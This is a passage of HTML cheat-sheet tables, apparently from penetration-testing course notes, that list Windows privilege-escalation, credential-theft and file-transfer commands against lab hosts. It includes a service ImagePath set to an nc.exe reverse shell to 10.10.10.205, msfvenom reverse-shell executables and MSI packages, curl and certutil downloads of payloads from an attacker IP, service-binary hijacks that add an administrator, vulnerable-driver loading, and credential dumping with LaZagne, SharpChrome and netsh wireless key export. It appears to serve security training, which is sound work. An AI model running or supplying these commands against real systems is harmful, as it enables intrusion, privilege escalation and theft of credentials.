<td>Checking a service status</td>
</tr>
<tr class="even">
<td><code>Set-DnsServerGlobalQueryBlockList -Enable $false -ComputerName dc01.inlanefreight.local</code></td>
<td>Disabling the global query block list</td>
</tr>
<tr class="odd">
<td><code>Add-DnsServerResourceRecordA -Name wpad -ZoneName inlanefreight.local -ComputerName dc01.inlanefreight.local -IPv4Address 10.10.14.3</code></td>
<td>Adding a WPAD record</td>
</tr>
<tr class="even">
<td><code>cl /DUNICODE /D_UNICODE EnableSeLoadDriverPrivilege.cpp</code></td>
<td>Compile with cl.exe</td>
</tr>
<tr class="odd">
<td><code>reg add HKCU\System\CurrentControlSet\CAPCOM /v ImagePath /t REG_SZ /d "\??\C:\Tools\Capcom.sys"</code></td>
<td>Add reference to a driver (1)</td>
</tr>
<tr class="even">
<td><code>reg add HKCU\System\CurrentControlSet\CAPCOM /v Type /t REG_DWORD /d 1</code></td>
<td>Add reference to a driver (2)</td>
</tr>
<tr class="odd">
<td><code>.\DriverView.exe /stext drivers.txt</code> and
<code>cat drivers.txt \| Select-String -pattern Capcom</code></td>
<td>Check if driver is loaded</td>
</tr>
<tr class="even">
<td><code>EoPLoadDriver.exe System\CurrentControlSet\Capcom c:\Tools\Capcom.sys</code></td>
<td>Using EopLoadDriver</td>
</tr>
<tr class="odd">
<td><code>c:\Tools\PsService.exe security AppReadiness</code></td>
<td>Checking service permissions with PsService</td>
</tr>
<tr class="even">
<td><code>sc config AppReadiness binPath= "cmd /c net localgroup Administrators server_adm /add"</code></td>
<td>Modifying a service binary path</td>
</tr>
<tr class="odd">
<td><code>REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v EnableLUA</code></td>
<td>Confirming UAC is enabled</td>
</tr>
<tr class="even">
<td><code>REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v ConsentPromptBehaviorAdmin</code></td>
<td>Checking UAC level</td>
</tr>
<tr class="odd">
<td><code>[environment]::OSVersion.Version</code></td>
<td>Checking Windows version</td>
</tr>
<tr class="even">
<td><code>cmd /c echo %PATH%</code></td>
<td>Reviewing path variable</td>
</tr>
<tr class="odd">
<td><code>curl http://10.10.14.3:8080/srrstr.dll -O "C:\Users\sarah\AppData\Local\Microsoft\WindowsApps\srrstr.dll"</code></td>
<td>Downloading file with cURL in PowerShell</td>
</tr>
<tr class="even">
<td><code>rundll32 shell32.dll,Control_RunDLL C:\Users\sarah\AppData\Local\Microsoft\WindowsApps\srrstr.dll</code></td>
<td>Executing custom dll with rundll32.exe</td>
</tr>
<tr class="odd">
<td><code>.\SharpUp.exe audit</code></td>
<td>Running SharpUp</td>
</tr>
<tr class="even">
<td><code>icacls "C:\Program Files (x86)\PCProtect\SecurityService.exe"</code></td>
<td>Checking service permissions with icacls</td>
</tr>
<tr class="odd">
<td><code>cmd /c copy /Y SecurityService.exe "C:\Program Files (x86)\PCProtect\SecurityService.exe"</code></td>
<td>Replace a service binary</td>
</tr>
<tr class="even">
<td><code>wmic service get name,displayname,pathname,startmode \| findstr /i "auto" \| findstr /i /v "c:\windows\\" \| findstr /i /v """</code></td>
<td>Searching for unquoted service paths</td>
</tr>
<tr class="odd">
<td><code>accesschk.exe /accepteula "mrb3n" -kvuqsw hklm\System\CurrentControlSet\services</code></td>
<td>Checking for weak service ACLs in the Registry</td>
</tr>
<tr class="even">
<td><code>Set-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Services\ModelManagerService -Name "ImagePath" -Value "C:\Users\john\Downloads\nc.exe -e cmd.exe 10.10.10.205 443"</code></td>
<td>Changing ImagePath with PowerShell</td>
</tr>
<tr class="odd">
<td><code>Get-CimInstance Win32_StartupCommand \| select Name, command, Location, User \| fl</code></td>
<td>Check startup programs</td>
</tr>
<tr class="even">
<td><code>msfvenom -p windows/x64/meterpreter/reverse_https LHOST=10.10.14.3 LPORT=8443 -f exe &gt; maintenanceservice.exe</code></td>
<td>Generating a malicious binary</td>
</tr>
<tr class="odd">
<td><code>get-process -Id 3324</code></td>
<td>Enumerating a process ID with PowerShell</td>
</tr>
<tr class="even">
<td><code>get-service \| ? {$_.DisplayName -like 'Druva*'}</code></td>
<td>Enumerate a running service by name with PowerShell</td>
</tr>
</tbody>
</table>
<h4 id="credential-theft">Credential Theft</h4>
<table>
<colgroup>
<col style="width: 42%" />
<col style="width: 57%" />
</colgroup>
<thead>
<tr class="header">
<th><strong>Command</strong></th>
<th><strong>Description</strong></th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td><code>findstr /SIM /C:"password" *.txt *ini *.cfg *.config *.xml</code></td>
<td>Search for files with the phrase “password”</td>
</tr>
<tr class="even">
<td><code>gc 'C:\Users\htb-student\AppData\Local\Google\Chrome\User Data\Default\Custom Dictionary.txt' \| Select-String password</code></td>
<td>Searching for passwords in Chrome dictionary files</td>
</tr>
<tr class="odd">
<td><code>(Get-PSReadLineOption).HistorySavePath</code></td>
<td>Confirm PowerShell history save path</td>
</tr>
<tr class="even">
<td><code>gc (Get-PSReadLineOption).HistorySavePath</code></td>
<td>Reading PowerShell history file</td>
</tr>
<tr class="odd">
<td><code>$credential = Import-Clixml -Path 'C:\scripts\pass.xml'</code></td>
<td>Decrypting PowerShell credentials</td>
</tr>
<tr class="even">
<td><code>cd c:\Users\htb-student\Documents &amp; findstr /SI /M "password" *.xml *.ini *.txt</code></td>
<td>Searching file contents for a string</td>
</tr>
<tr class="odd">
<td><code>findstr /si password *.xml *.ini *.txt *.config</code></td>
<td>Searching file contents for a string</td>
</tr>
<tr class="even">
<td><code>findstr /spin "password" *.*</code></td>
<td>Searching file contents for a string</td>
</tr>
<tr class="odd">
<td><code>select-string -Path C:\Users\htb-student\Documents\*.txt -Pattern password</code></td>
<td>Search file contents with PowerShell</td>
</tr>
<tr class="even">
<td><code>dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config*</code></td>
<td>Search for file extensions</td>
</tr>
<tr class="odd">
<td><code>where /R C:\ *.config</code></td>
<td>Search for file extensions</td>
</tr>
<tr class="even">
<td><code>Get-ChildItem C:\ -Recurse -Include *.rdp, *.config, *.vnc, *.cred -ErrorAction Ignore</code></td>
<td>Search for file extensions using PowerShell</td>
</tr>
<tr class="odd">
<td><code>cmdkey /list</code></td>
<td>List saved credentials</td>
</tr>
<tr class="even">
<td><code>.\SharpChrome.exe logins /unprotect</code></td>
<td>Retrieve saved Chrome credentials</td>
</tr>
<tr class="odd">
<td><code>.\lazagne.exe -h</code></td>
<td>View LaZagne help menu</td>
</tr>
<tr class="even">
<td><code>.\lazagne.exe all</code></td>
<td>Run all LaZagne modules</td>
</tr>
<tr class="odd">
<td><code>Invoke-SessionGopher -Target WINLPE-SRV01</code></td>
<td>Running SessionGopher</td>
</tr>
<tr class="even">
<td><code>netsh wlan show profile</code></td>
<td>View saved wireless networks</td>
</tr>
<tr class="odd">
<td><code>netsh wlan show profile ilfreight_corp key=clear</code></td>
<td>Retrieve saved wireless passwords</td>
</tr>
</tbody>
</table>
<h4 id="other-commands">Other Commands</h4>
<table>
<colgroup>
<col style="width: 42%" />
<col style="width: 57%" />
</colgroup>
<thead>
<tr class="header">
<th><strong>Command</strong></th>
<th><strong>Description</strong></th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td><code>certutil.exe -urlcache -split -f http://10.10.14.3:8080/shell.bat shell.bat</code></td>
<td>Transfer file with certutil</td>
</tr>
<tr class="even">
<td><code>certutil -encode file1 encodedfile</code></td>
<td>Encode file with certutil</td>
</tr>
<tr class="odd">
<td><code>certutil -decode encodedfile file2</code></td>
<td>Decode file with certutil</td>
</tr>
<tr class="even">
<td><code>reg query HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\Installer</code></td>
<td>Query for always install elevated registry key (1)</td>
</tr>
<tr class="odd">
<td><code>reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer</code></td>
<td>Query for always install elevated registry key (2)</td>
</tr>
<tr class="even">
<td><code>msfvenom -p windows/shell_reverse_tcp lhost=10.10.14.3 lport=9443 -f msi &gt; aie.msi</code></td>
<td>Generate a malicious MSI package</td>
</tr>
<tr class="odd">
<td><code>msiexec /i c:\users\htb-student\desktop\aie.msi /quiet /qn /norestart</code></td>
<td>Executing an MSI package from command line</td>
</tr>
<tr class="even">
<td><code>schtasks /query /fo LIST /v</code></td>
<td>Enumerate scheduled tasks</td>
</tr>
<tr class="odd">
<td><code>Get-ScheduledTask \| select TaskName,State</code></td>
<td>Enumerate scheduled tasks with PowerShell</td>
</tr>
<tr class="even">
<td><code>.\accesschk64.exe /accepteula -s -d C:\Scripts\</code></td>
<td>Check permissions on a directory</td>
</tr>
<tr class="odd">
<td><code>Get-LocalUser</code></td>
<td>Check local user description field</td>
</tr>
<tr class="even">
<td><code>Get-WmiObject -Class Win32_OperatingSystem \| select Description</code></td>
<td>Enumerate computer description field</td>
</tr>
<tr class="odd">
<td><code>guestmount -a SQL01-disk1.vmdk -i --ro /mnt/vmd</code></td>
<td>Mount VMDK on Linux</td>
</tr>
<tr class="even">
<td><code>guestmount --add WEBSRV10.vhdx  --ro /mnt/vhdx/ -m /dev/sda1</code></td>
<td>Mount VHD/VHDX on Linux</td>
</tr>
<tr class="odd">
<td><code>sudo python2.7 windows-exploit-suggester.py  --update</code></td>
<td>Update Windows Exploit Suggester database</td>
</tr>
<tr class="even">
<td><code>python2.7 windows-exploit-suggester.py  --database 2021-05-13-mssb.xls --systeminfo win7lpe-systeminfo.txt</code></td>
<td>Running Windows Exploit Suggester</td>
</tr>
</tbody>
</table>
<p><a id="reporting--capstone"></a> ## Reporting &amp; Capstone</p>
<p><a id="27-documentation--reporting"></a> ### 27. Documentation &amp;
Reporting</p>
<p><a id="28-attacking-enterprise-networks"></a> ### 28. Attacking
Enterprise Networks</p>
</body>
</html>
